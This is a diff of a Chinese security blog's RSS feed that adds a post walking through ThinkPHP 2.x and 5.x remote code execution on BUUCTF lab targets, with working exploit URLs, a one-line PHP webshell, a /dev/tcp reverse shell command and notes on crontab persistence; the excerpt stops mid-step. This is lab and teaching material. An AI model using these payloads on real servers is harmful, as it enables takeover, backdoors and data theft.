@@ -5,8 +5,11 @@
         <link>https://bae-ace.github.io</link>
         <description>bae的个人博客</description>
         <language>zh-CN</language>
-        <pubDate>Sun, 27 Jul 2025 17:25:25 +0800</pubDate>
-        <lastBuildDate>Sun, 27 Jul 2025 17:25:25 +0800</lastBuildDate>
+        <pubDate>Mon, 28 Jul 2025 14:18:44 +0800</pubDate>
+        <lastBuildDate>Mon, 28 Jul 2025 14:18:44 +0800</lastBuildDate>
+        <category>工具</category>
+        <category>sqlmap</category>
+        <category>渗透测试</category>
         <category>PWN</category>
         <category>ELF</category>
         <category>ROP</category>
@@ -14,10 +17,7 @@
         <category>二进制安全</category>
         <category>Web安全</category>
         <category>SQL注入</category>
-        <category>渗透测试</category>
         <category>网络安全</category>
-        <category>工具</category>
-        <category>sqlmap</category>
         <category>Struts2</category>
         <category>RCE</category>
         <category>漏洞复现</category>
@@ -32,6 +32,231 @@
         <category>漏洞利用</category>
         <category>信息收集</category>
         <category>子域名</category>
+        <item>
+            <guid isPermalink="true">https://bae-ace.github.io/2025/07/28/ThinkPHP-2-x-5-x-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%A9%E7%94%A8%EF%BC%88%E5%9F%BA%E4%BA%8E-BUUCTF%EF%BC%89/</guid>
+            <title>ThinkPHP 2.x &amp; 5.x 远程代码执行漏洞复现与利用（基于 BUUCTF）</title>
+            <link>https://bae-ace.github.io/2025/07/28/ThinkPHP-2-x-5-x-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%A9%E7%94%A8%EF%BC%88%E5%9F%BA%E4%BA%8E-BUUCTF%EF%BC%89/</link>
+            <category>Web安全</category>
+            <category>RCE</category>
+            <category>漏洞复现</category>
+            <category>ThinkPHP</category>
+            <pubDate>Mon, 28 Jul 2025 14:18:44 +0800</pubDate>
+            <description><![CDATA[ &lt;h1 id=&#34;ThinkPHP-2-x-5-x-远程代码执行漏洞复现与利用（基于-BUUCTF）&#34;&gt;&lt;a href=&#34;#ThinkPHP-2-x-5-x-远程代码执行漏洞复现与利用（基于-BUUCTF）&#34; class=&#34;headerlink&#34; title=&#34;ThinkPHP 2.x &amp;amp; 5.x 远程代码执行漏洞复现与利用（基于 BUUCTF）&#34;&gt;&lt;/a&gt;ThinkPHP 2.x &amp;amp; 5.x 远程代码执行漏洞复现与利用（基于 BUUCTF）&lt;/h1&gt;&lt;h2 id=&#34;一、前言&#34;&gt;&lt;a href=&#34;#一、前言&#34; class=&#34;headerlink&#34; title=&#34;一、前言&#34;&gt;&lt;/a&gt;一、前言&lt;/h2&gt;&lt;p&gt;ThinkPHP 是一个广受欢迎的 PHP 开发框架，但其早期版本（2.x 和 5.0.x 至 5.0.23）因设计缺陷存在严重的&lt;strong&gt;远程代码执行（RCE）漏洞&lt;/strong&gt;。这些漏洞允许攻击者通过精心构造的 URL 参数执行任意 PHP 代码或系统命令，甚至实现服务器完全控制。本文基于 &lt;strong&gt;BUUCTF&lt;/strong&gt; 在线靶场，详细复现 ThinkPHP 2.x 和 5.x 的 RCE 漏洞，涵盖漏洞原理、利用过程、蚁剑连接以及后门植入的可能性，旨在帮助安全从业者和开发者深入理解和防范此类漏洞。&lt;/p&gt;
+&lt;p&gt;本文将分为两部分：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;ThinkPHP 2.x RCE 漏洞&lt;/strong&gt;：利用模板变量解析缺陷执行代码和命令。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;ThinkPHP 5.x RCE 漏洞&lt;/strong&gt;：通过框架路由调用任意函数实现代码执行。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;二、ThinkPHP-2-x-RCE-漏洞复现&#34;&gt;&lt;a href=&#34;#二、ThinkPHP-2-x-RCE-漏洞复现&#34; class=&#34;headerlink&#34; title=&#34;二、ThinkPHP 2.x RCE 漏洞复现&#34;&gt;&lt;/a&gt;二、ThinkPHP 2.x RCE 漏洞复现&lt;/h2&gt;&lt;h3 id=&#34;1-靶场环境&#34;&gt;&lt;a href=&#34;#1-靶场环境&#34; class=&#34;headerlink&#34; title=&#34;1. 靶场环境&#34;&gt;&lt;/a&gt;1. 靶场环境&lt;/h3&gt;&lt;p&gt;BUUCTF 提供在线靶场，无需自行搭建环境。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;ThinkPHP 2.x RCE 漏洞地址&lt;/strong&gt;：&lt;code&gt;https://buuoj.cn/challenges#[ThinkPHP]2-Rce&lt;/code&gt;&lt;br&gt;开启靶场，访问页面后，通常显示简陋的 ThinkPHP 2.x 欢迎页面，但后台隐藏着强大的远程命令执行能力 。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;2-漏洞原理&#34;&gt;&lt;a href=&#34;#2-漏洞原理&#34; class=&#34;headerlink&#34; title=&#34;2. 漏洞原理&#34;&gt;&lt;/a&gt;2. 漏洞原理&lt;/h3&gt;&lt;p&gt;ThinkPHP 2.x 的模板引擎在处理 URL 参数时，直接将参数拼接为模板变量，未进行严格过滤。例如，URL 参数 &lt;code&gt;name=$&amp;#123;@phpinfo()&amp;#125;&lt;/code&gt; 会被解析为：&lt;/p&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; $&amp;#123;@&lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;phpinfo&lt;/span&gt;()&amp;#125; &lt;span class=&#34;hljs-meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;由于 &lt;code&gt;@phpinfo()&lt;/code&gt; 是合法的 PHP 函数调用，服务器会执行 &lt;code&gt;phpinfo()&lt;/code&gt; 函数并返回结果。如果结合 &lt;code&gt;eval()&lt;/code&gt; 或 &lt;code&gt;assert()&lt;/code&gt;，攻击者可通过 GET 或 POST 参数进一步执行任意代码或系统命令，形成完全控制。&lt;/p&gt;
+&lt;h3 id=&#34;3-漏洞利用过程&#34;&gt;&lt;a href=&#34;#3-漏洞利用过程&#34; class=&#34;headerlink&#34; title=&#34;3. 漏洞利用过程&#34;&gt;&lt;/a&gt;3. 漏洞利用过程&lt;/h3&gt;&lt;h4 id=&#34;步骤-1：测试代码执行（POC1）&#34;&gt;&lt;a href=&#34;#步骤-1：测试代码执行（POC1）&#34; class=&#34;headerlink&#34; title=&#34;步骤 1：测试代码执行（POC1）&#34;&gt;&lt;/a&gt;步骤 1：测试代码执行（POC1）&lt;/h4&gt;&lt;p&gt;使用以下 Payload 测试是否可以执行 PHP 代码：&lt;/p&gt;
+&lt;figure class=&#34;highlight ruby&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs ruby&#34;&gt;&lt;span class=&#34;hljs-symbol&#34;&gt;http:&lt;/span&gt;/&lt;span class=&#34;hljs-regexp&#34;&gt;/node3.buuoj.cn:26104/&lt;/span&gt;&lt;span class=&#34;hljs-string&#34;&gt;?s&lt;/span&gt;=&lt;span class=&#34;hljs-regexp&#34;&gt;/index/index&lt;/span&gt;&lt;span class=&#34;hljs-regexp&#34;&gt;/name/&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$&amp;#123;&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;@phpinfo&lt;/span&gt;()&amp;#125;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;strong&gt;结果&lt;/strong&gt;：页面返回 &lt;code&gt;phpinfo()&lt;/code&gt; 的详细信息，证明代码被成功解析执行 。&lt;/p&gt;
+&lt;h4 id=&#34;步骤-2：执行系统命令（POC2）&#34;&gt;&lt;a href=&#34;#步骤-2：执行系统命令（POC2）&#34; class=&#34;headerlink&#34; title=&#34;步骤 2：执行系统命令（POC2）&#34;&gt;&lt;/a&gt;步骤 2：执行系统命令（POC2）&lt;/h4&gt;&lt;p&gt;利用 &lt;code&gt;eval()&lt;/code&gt; 结合 GET 参数执行系统命令（如 &lt;code&gt;ls&lt;/code&gt;）：&lt;/p&gt;
+&lt;figure class=&#34;highlight asciidoc&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs asciidoc&#34;&gt;&lt;span class=&#34;hljs-link&#34;&gt;http://node3.buuoj.cn:26104/?s=/index/index/name=$&amp;#123;@eval($_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;1&lt;/span&gt;])&amp;#125;&amp;amp;1=system(%27ls%27);&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;strong&gt;参数说明&lt;/strong&gt;：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;name=$&amp;#123;@eval($_GET[1])&amp;#125;&lt;/code&gt;：通过 &lt;code&gt;eval()&lt;/code&gt; 执行 GET 参数 &lt;code&gt;1&lt;/code&gt; 的内容。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;1=system(%27ls%27)&lt;/code&gt;：执行 &lt;code&gt;system(&amp;#39;ls&amp;#39;)&lt;/code&gt;，其中 &lt;code&gt;%27&lt;/code&gt; 是 URL 编码的单引号 &lt;code&gt;&amp;#39;&lt;/code&gt;。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;结果&lt;/strong&gt;：页面返回目录列表，例如：&lt;figure class=&#34;highlight axapta&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs axapta&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;index&lt;/span&gt;.php&lt;br&gt;flag&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+说明 &lt;code&gt;ls&lt;/code&gt; 命令执行成功。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id=&#34;步骤-3：读取-Flag-文件&#34;&gt;&lt;a href=&#34;#步骤-3：读取-Flag-文件&#34; class=&#34;headerlink&#34; title=&#34;步骤 3：读取 Flag 文件&#34;&gt;&lt;/a&gt;步骤 3：读取 Flag 文件&lt;/h4&gt;&lt;p&gt;尝试读取 &lt;code&gt;/flag&lt;/code&gt; 文件内容：&lt;/p&gt;
+&lt;figure class=&#34;highlight asciidoc&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs asciidoc&#34;&gt;&lt;span class=&#34;hljs-link&#34;&gt;http://node3.buuoj.cn:26104/?s=/index/index/name=$&amp;#123;@eval($_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;1&lt;/span&gt;])&amp;#125;&amp;amp;1=system(%27cat%20flag%27);&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;strong&gt;结果&lt;/strong&gt;：页面返回类似以下内容：&lt;/p&gt;
+&lt;figure class=&#34;highlight dust&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs dust&#34;&gt;&lt;span class=&#34;language-xml&#34;&gt;flag&lt;/span&gt;&lt;span class=&#34;hljs-template-variable&#34;&gt;&amp;#123;xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;这表明目标服务器已被完全控制 。&lt;/p&gt;
+&lt;h3 id=&#34;4-使用蚁剑连接&#34;&gt;&lt;a href=&#34;#4-使用蚁剑连接&#34; class=&#34;headerlink&#34; title=&#34;4. 使用蚁剑连接&#34;&gt;&lt;/a&gt;4. 使用蚁剑连接&lt;/h3&gt;&lt;p&gt;为了更方便地操作服务器，可以上传一句话木马并使用蚁剑（AntSword）进行交互。&lt;/p&gt;
+&lt;h4 id=&#34;构造-Payload：&#34;&gt;&lt;a href=&#34;#构造-Payload：&#34; class=&#34;headerlink&#34; title=&#34;构造 Payload：&#34;&gt;&lt;/a&gt;构造 Payload：&lt;/h4&gt;&lt;p&gt;使用 POST 参数构造一句话木马：&lt;/p&gt;
+&lt;figure class=&#34;highlight asciidoc&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs asciidoc&#34;&gt;&lt;span class=&#34;hljs-link&#34;&gt;http://node3.buuoj.cn:26104/?s=/index/index/name=$&amp;#123;@eval($_POST&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;1&lt;/span&gt;])&amp;#125;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;strong&gt;蚁剑配置&lt;/strong&gt;：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;URL&lt;/strong&gt;：&lt;code&gt;http://node3.buuoj.cn:26104/?s=/index/index/name=$&amp;#123;@eval($_POST[1])&amp;#125;&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;密码&lt;/strong&gt;：&lt;code&gt;1&lt;/code&gt;（对应 &lt;code&gt;$_POST[1]&lt;/code&gt;）&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;类型&lt;/strong&gt;：PHP（原生）&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;编码&lt;/strong&gt;：默认&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;连接成功后，可使用蚁剑进行：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;命令行执行&lt;/li&gt;
+&lt;li&gt;文件管理（如上传、下载）&lt;/li&gt;
+&lt;li&gt;终端交互&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;5-进一步操作&#34;&gt;&lt;a href=&#34;#5-进一步操作&#34; class=&#34;headerlink&#34; title=&#34;5. 进一步操作&#34;&gt;&lt;/a&gt;5. 进一步操作&lt;/h3&gt;&lt;p&gt;在真实环境中，可进行以下高级操作：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;上传 WebShell&lt;/strong&gt;：&lt;ul&gt;
+&lt;li&gt;在蚁剑中上传一句话木马（如 &lt;code&gt;&amp;lt;?php @eval($_POST[&amp;#39;pass&amp;#39;]);?&amp;gt;&lt;/code&gt;）或冰蝎（Behinder）木马。&lt;/li&gt;
+&lt;li&gt;保存到可访问路径（如 &lt;code&gt;/var/www/html/shell.php&lt;/code&gt;）。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;反弹 Shell&lt;/strong&gt;：&lt;ul&gt;
+&lt;li&gt;在 Kali 上启动监听：&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;nc -lvnp 4444&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;li&gt;在蚁剑中执行：&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/你的IP/4444 0&amp;gt;&amp;amp;1&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;持久化后门&lt;/strong&gt;：&lt;ul&gt;
+&lt;li&gt;添加计划任务（crontab）定时反弹 Shell。&lt;/li&gt;
+&lt;li&gt;修改 &lt;code&gt;.bashrc&lt;/code&gt; 文件，添加后门命令。&lt;/li&gt;
+&lt;li&gt;写入定时任务（如每分钟执行反弹 Shell）。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;三、ThinkPHP-5-x-RCE-漏洞复现&#34;&gt;&lt;a href=&#34;#三、ThinkPHP-5-x-RCE-漏洞复现&#34; class=&#34;headerlink&#34; title=&#34;三、ThinkPHP 5.x RCE 漏洞复现&#34;&gt;&lt;/a&gt;三、ThinkPHP 5.x RCE 漏洞复现&lt;/h2&gt;&lt;h3 id=&#34;1-靶场环境-1&#34;&gt;&lt;a href=&#34;#1-靶场环境-1&#34; class=&#34;headerlink&#34; title=&#34;1. 靶场环境&#34;&gt;&lt;/a&gt;1. 靶场环境&lt;/h3&gt;&lt;p&gt;BUUCTF 提供 ThinkPHP 5.x 在线靶场：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;ThinkPHP 5.x RCE 漏洞地址&lt;/strong&gt;：&lt;code&gt;https://buuoj.cn/challenges#[ThinkPHP]5-Rce&lt;/code&gt;&lt;br&gt;开启靶场，访问页面显示：&lt;/li&gt;
+&lt;/ul&gt;
+&lt;figure class=&#34;highlight armasm&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs armasm&#34;&gt;&lt;span class=&#34;hljs-symbol&#34;&gt;ThinkPHP&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;V5&lt;/span&gt;&lt;br&gt;十年磨一剑 - 为 API 开发设计的高性能框架&lt;br&gt;[ &lt;span class=&#34;hljs-built_in&#34;&gt;V5&lt;/span&gt;.&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; 版本由 七牛云 独家赞助发布 ]&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;这表明靶场运行 ThinkPHP 5.x（版本 &amp;lt;&amp;#x3D; 5.0.23），漏洞复现环境已就绪 。&lt;/p&gt;
+&lt;h3 id=&#34;2-漏洞原理-1&#34;&gt;&lt;a href=&#34;#2-漏洞原理-1&#34; class=&#34;headerlink&#34; title=&#34;2. 漏洞原理&#34;&gt;&lt;/a&gt;2. 漏洞原理&lt;/h3&gt;&lt;p&gt;ThinkPHP 5.x 的 RCE 漏洞源于框架对 &lt;code&gt;\think\app::invokefunction&lt;/code&gt; 方法的未授权访问。攻击者可通过 URL 参数调用 &lt;code&gt;call_user_func_array&lt;/code&gt; 函数，动态执行任意 PHP 函数（如 &lt;code&gt;phpinfo&lt;/code&gt;、&lt;code&gt;system&lt;/code&gt;），并传递参数。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;利用链&lt;/strong&gt;：&lt;/p&gt;
+&lt;figure class=&#34;highlight sas&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs sas&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;index&lt;/span&gt;.php&lt;br&gt;└── ?s=&lt;span class=&#34;hljs-keyword&#34;&gt;index&lt;/span&gt;/\think\app/invokefunction&lt;br&gt;        &lt;span class=&#34;hljs-variable&#34;&gt;&amp;amp;function&lt;/span&gt;=call_user_func_array&lt;br&gt;        &lt;span class=&#34;hljs-variable&#34;&gt;&amp;amp;vars&lt;/span&gt;[0]=phpinfo&lt;br&gt;        &lt;span class=&#34;hljs-variable&#34;&gt;&amp;amp;vars&lt;/span&gt;[1][]=-1&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;strong&gt;参数说明&lt;/strong&gt;：&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;参数&lt;/th&gt;
+&lt;th&gt;含义说明&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;s&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;ThinkPHP 路由，访问框架核心类&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;function&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;被调用的函数（如 &lt;code&gt;call_user_func_array&lt;/code&gt;）&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;vars[0]&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;实际调用的函数名称（如 &lt;code&gt;phpinfo&lt;/code&gt;、&lt;code&gt;system&lt;/code&gt;）&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;vars[1][]&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;函数参数数组（如 &lt;code&gt;whoami&lt;/code&gt;、&lt;code&gt;-1&lt;/code&gt;）&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;&lt;/table&gt;
+&lt;h3 id=&#34;3-漏洞利用过程-1&#34;&gt;&lt;a href=&#34;#3-漏洞利用过程-1&#34; class=&#34;headerlink&#34; title=&#34;3. 漏洞利用过程&#34;&gt;&lt;/a&gt;3. 漏洞利用过程&lt;/h3&gt;&lt;h4 id=&#34;步骤-1：信息探测（测试-phpinfo）&#34;&gt;&lt;a href=&#34;#步骤-1：信息探测（测试-phpinfo）&#34; class=&#34;headerlink&#34; title=&#34;步骤 1：信息探测（测试 phpinfo）&#34;&gt;&lt;/a&gt;步骤 1：信息探测（测试 &lt;code&gt;phpinfo&lt;/code&gt;）&lt;/h4&gt;&lt;p&gt;构造 Payload 测试漏洞：&lt;/p&gt;
+&lt;figure class=&#34;highlight asciidoc&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs asciidoc&#34;&gt;&lt;span class=&#34;hljs-link&#34;&gt;http://node5.buuoj.cn:27945/index.php?s=index/\think\app/invokefunction&amp;amp;function=call_user_func_array&amp;amp;vars&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;0&lt;/span&gt;]=phpinfo&amp;amp;vars[1][]=-1&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;strong&gt;结果&lt;/strong&gt;：页面返回完整的 &lt;code&gt;phpinfo()&lt;/code&gt; 信息，证明漏洞存在且可利用。&lt;/p&gt;
+&lt;h4 id=&#34;步骤-2：执行系统命令（whoami）&#34;&gt;&lt;a href=&#34;#步骤-2：执行系统命令（whoami）&#34; class=&#34;headerlink&#34; title=&#34;步骤 2：执行系统命令（whoami）&#34;&gt;&lt;/a&gt;步骤 2：执行系统命令（&lt;code&gt;whoami&lt;/code&gt;）&lt;/h4&gt;&lt;p&gt;修改 Payload 执行 &lt;code&gt;whoami&lt;/code&gt; 命令：&lt;/p&gt;
+&lt;figure class=&#34;highlight asciidoc&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs asciidoc&#34;&gt;&lt;span class=&#34;hljs-link&#34;&gt;http://node5.buuoj.cn:27945/index.php?s=index/\think\app/invokefunction&amp;amp;function=call_user_func_array&amp;amp;vars&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;0&lt;/span&gt;]=system&amp;amp;vars[1][]=whoami&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;strong&gt;结果&lt;/strong&gt;：页面返回：&lt;/p&gt;
+&lt;figure class=&#34;highlight haskell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs haskell&#34;&gt;&lt;span class=&#34;hljs-title&#34;&gt;www&lt;/span&gt;-&lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;data&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;表明 Web 服务以 &lt;code&gt;www-data&lt;/code&gt; 用户运行，命令执行成功。&lt;/p&gt;
+&lt;h4 id=&#34;步骤-3：读取-Flag-文件-1&#34;&gt;&lt;a href=&#34;#步骤-3：读取-Flag-文件-1&#34; class=&#34;headerlink&#34; title=&#34;步骤 3：读取 Flag 文件&#34;&gt;&lt;/a&gt;步骤 3：读取 Flag 文件&lt;/h4&gt;&lt;p&gt;尝试读取 &lt;code&gt;/flag&lt;/code&gt; 或根目录下的 &lt;code&gt;flag&lt;/code&gt; 文件：&lt;/p&gt;
